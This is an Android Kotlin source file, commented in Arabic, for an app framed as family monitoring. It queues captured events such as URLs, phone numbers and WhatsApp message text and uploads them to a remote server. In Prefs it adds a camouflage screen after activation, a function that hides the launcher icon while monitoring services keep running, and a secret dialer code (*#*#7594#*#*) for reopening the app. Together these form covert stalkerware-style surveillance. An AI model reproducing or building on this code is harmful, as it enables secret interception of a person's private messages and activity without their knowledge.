package com.family.monitor

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

/**
 * مخزن الأحداث: يجمّع الأحداث محليًا ويتحمل انقطاع الشبكة،
 * ويُحفظ في SharedPreferences حتى لا يضيع شيء عند إعادة تشغيل الجهاز.
 */
object EventStore {
    private const val PREFS = "monitor_store"
    private const val KEY_QUEUE = "queue"
    private const val MAX_EVENTS = 6000

    // منع التكرار: بصمة الحدث → وقت إضافتها
    private val fingerprints = mutableMapOf<String, Long>()

    fun addEvent(ctx: Context, ev: JSONObject) {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val arr = JSONArray(prefs.getString(KEY_QUEUE, "[]") ?: "[]")
        // منع التكرار خلال 15 ثانية — البصمة تشمل نص الرسالة حتى لا تختلط رسائل واتساب المتتالية
        val fp = fingerprint(ev)
        val now = System.currentTimeMillis()
        fingerprints.entries.removeAll { it.value < now - 15_000 }
        if (fingerprints.containsKey(fp)) return
        fingerprints[fp] = now

        ev.put("occurredAt", isoNow())
        arr.put(ev)
        // حد أقصى للحفظ المحلي
        while (arr.length() > MAX_EVENTS) {
            arr.remove(0)
        }
        prefs.edit().putString(KEY_QUEUE, arr.toString()).apply()
    }

    /** يأخذ أول N أحداث ويرسلها ويمسحها عند النجاح */
    fun sync(ctx: Context): Boolean {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val queue = JSONArray(prefs.getString(KEY_QUEUE, "[]") ?: "[]")
        if (queue.length() == 0) return true

        val server = Prefs.serverUrl(ctx) ?: return false
        val key = Prefs.apiKey(ctx) ?: return false

        val batch = JSONArray()
        for (i in 0 until minOf(queue.length(), 200)) batch.put(queue.get(i))
        val ok = Api.sendEvents(server, key, batch)
        if (!ok) return false

        val remaining = JSONArray()
        for (i in batch.length() until queue.length()) remaining.put(queue.get(i))
        prefs.edit().putString(KEY_QUEUE, remaining.toString()).apply()
        return true
    }

    fun pendingCount(ctx: Context): Int {
        val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        return JSONArray(prefs.getString(KEY_QUEUE, "[]") ?: "[]").length()
    }

    private fun fingerprint(ev: JSONObject): String {
        return listOf(
            ev.optString("type"), ev.optString("url"), ev.optString("phone"),
            ev.optString("packageName"), ev.optString("app"), ev.optString("title"),
            // نص رسالة واتساب (meta.text) حتى لا تُعتبر رسالتان متتاليتان من نفس الشخص تكرارًا
            try { ev.getJSONObject("meta").optString("text") } catch (_: Exception) { "" }
        ).joinToString("|")
    }

    private fun isoNow(): String {
        val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US)
        sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
        return sdf.format(java.util.Date())
    }
}

/** الإعدادات المحفوظة على الجهاز */
object Prefs {
    private const val PREFS = "monitor_config"

    /** نوع الجهاز: main (أساسي/لوحة) أو secondary (فرعي/مراقبة) */
    fun role(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("device_role", null)

    fun setRole(ctx: Context, role: String) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .putString("device_role", role).apply()
    }

    fun clearRole(ctx: Context) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .remove("device_role").apply()
    }

    /** رابط لوحة المتابعة (الجهاز الأساسي) */
    fun panelUrl(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("panel_url", null)

    fun setPanelUrl(ctx: Context, url: String) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .putString("panel_url", url).apply()
    }

    fun clearPanelUrl(ctx: Context) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .remove("panel_url").apply()
    }

    fun serverUrl(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("server_url", null)

    fun apiKey(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("api_key", null)

    fun deviceName(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("device_name", null)

    fun save(ctx: Context, serverUrl: String, apiKey: String, deviceName: String) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .putString("server_url", serverUrl)
            .putString("api_key", apiKey)
            .putString("device_name", deviceName)
            .apply()
    }

    // ---------- التفعيل ووضع التمويه ----------

    /** هل اكتمل إعداد الجهاز الفرعي (التسجيل)؟ — بعدها تظهر شاشة التمويه بدل الإعدادات */
    fun isActivated(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("activated", false)

    fun setActivated(ctx: Context, v: Boolean) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
            .putBoolean("activated", v).apply()
    }

    // ---------- إخفاء أيقونة التطبيق ----------

    /** هل أيقونة التطبيق مخفية من قائمة التطبيقات؟ */
    fun isIconHidden(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("icon_hidden", false)

    /**
     * إخفاء/إظهار أيقونة التطبيق من قائمة التطبيقات.
     * الخدمات (المراقبة/التصفح/الإشعارات) تستمر في العمل طبيعيًا،
     * والعودة إلى التطبيق تكون بالكود السري من لوحة الاتصال:
     *   *#*#7594#*#*
     */
    fun setIconHidden(ctx: Context, hidden: Boolean) {
        val pm = ctx.packageManager
        try {
            pm.setComponentEnabledSetting(
                android.content.ComponentName(ctx, Config.LAUNCHER_ALIAS),
                if (hidden) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
                .putBoolean("icon_hidden", hidden).apply()
        } catch (e: Exception) {
            android.util.Log.e("Prefs", "تعذر تغيير حالة الأيقونة", e)
        }
    }
}
